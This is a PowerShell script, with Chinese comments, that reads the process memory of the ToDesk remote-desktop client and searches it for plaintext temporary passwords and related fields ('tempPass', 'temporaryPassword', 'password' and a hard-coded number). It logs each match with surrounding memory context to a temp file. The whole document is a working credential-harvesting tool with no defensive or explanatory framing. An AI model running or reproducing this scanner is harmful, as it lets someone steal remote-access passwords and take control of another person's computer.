# ToDesk 临时密码内存扫描：在 ToDesk.exe 的可读内存里找明文密码/相关字段
param(
    [int]$TargetPid = 0,
    [string]$OutFile = "C:\Users\Administrator\AppData\Local\Temp\todesk_scan.txt"
)

$ErrorActionPreference = "Stop"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class MemScan {
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out IntPtr read);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, int len);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);
}
"@

if ($TargetPid -eq 0) {
    $cand = Get-Process ToDesk -ErrorAction SilentlyContinue |
        Where-Object { $_.SessionId -ne 0 } |
        Sort-Object WorkingSet64 -Descending |
        Select-Object -First 1

    if ($null -eq $cand) {
        throw "找不到控制台会话里的 ToDesk.exe 进程"
    }

    $TargetPid = $cand.Id
}

$PROCESS_VM_READ = 0x10
$PROCESS_QUERY_INFORMATION = 0x400
$MEM_COMMIT = 0x1000
$READABLE = @(0x02, 0x04, 0x08, 0x20, 0x40, 0x80)

$h = [MemScan]::OpenProcess($PROCESS_VM_READ -bor $PROCESS_QUERY_INFORMATION, $false, $TargetPid)

if ($h -eq [IntPtr]::Zero) {
    throw "OpenProcess 失败，错误码 $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

$patterns = @("tempPass", "tempAuthPass", "temporaryPassword", "827428815", "passwd", "Password", "password")

$lines = New-Object System.Collections.Generic.List[string]
$lines.Add("pid=$TargetPid patterns=$($patterns -join ',')")

$mbi = New-Object MemScan+MEMORY_BASIC_INFORMATION
$addr = [IntPtr]::Zero
$chunk = 4MB
$buf = New-Object byte[] $chunk
$totalRegions = 0
$scanned = 0

while ($true) {
    $ret = [MemScan]::VirtualQueryEx($h, $addr, [ref]$mbi, [Runtime.InteropServices.Marshal]::SizeOf($mbi))

    if ($ret -eq 0) {
        break
    }

    $size = [int64]$mbi.RegionSize
    $base = [int64]$mbi.BaseAddress

    if ($mbi.State -eq $MEM_COMMIT -and $READABLE -contains ([int]$mbi.Protect -band 0xFF)) {
        $totalRegions += 1
        $offset = 0

        while ($offset -lt $size) {
            $want = [int][Math]::Min($chunk, $size - $offset)
            $read = [IntPtr]::Zero
            $ok = [MemScan]::ReadProcessMemory($h, [IntPtr]($base + $offset), $buf, $want, [ref]$read)

            if ($ok -and $read.ToInt64() -gt 0) {
                $len = [int]$read.ToInt64()
                $text = [Text.Encoding]::ASCII.GetString($buf, 0, $len)
                $scanned += $len

                foreach ($p in $patterns) {
                    $idx = 0

                    while ($true) {
                        $idx = $text.IndexOf($p, $idx, [StringComparison]::OrdinalIgnoreCase)

                        if ($idx -lt 0) {
                            break
                        }

                        $s = [Math]::Max(0, $idx - 120)
                        $e = [Math]::Min($len, $idx + 260)
                        $window = $text.Substring($s, $e - $s)
                        $clean = ($window -replace '[^\x20-\x7E]', '.')

                        $lines.Add(("HIT[" + $p + "] addr=0x{0:X} ctx={1}" -f ($base + $offset + $idx), $clean))
                        $idx += $p.Length
                    }
                }
            }

            $offset += $chunk
        }
    }

    $next = $base + $size

    if ($next -le $base) {
        break
    }

    $addr = [IntPtr]$next

    if ($base -gt 0x7FFFFFFF0000) {
        break
    }
}

[MemScan]::CloseHandle($h) | Out-Null

$lines.Add("regions=$totalRegions scannedMB=$([math]::Round($scanned / 1MB, 1))")
Set-Content -Path $OutFile -Value $lines -Encoding UTF8
Write-Output "done pid=$TargetPid regions=$totalRegions scannedMB=$([math]::Round($scanned / 1MB, 1)) out=$OutFile"
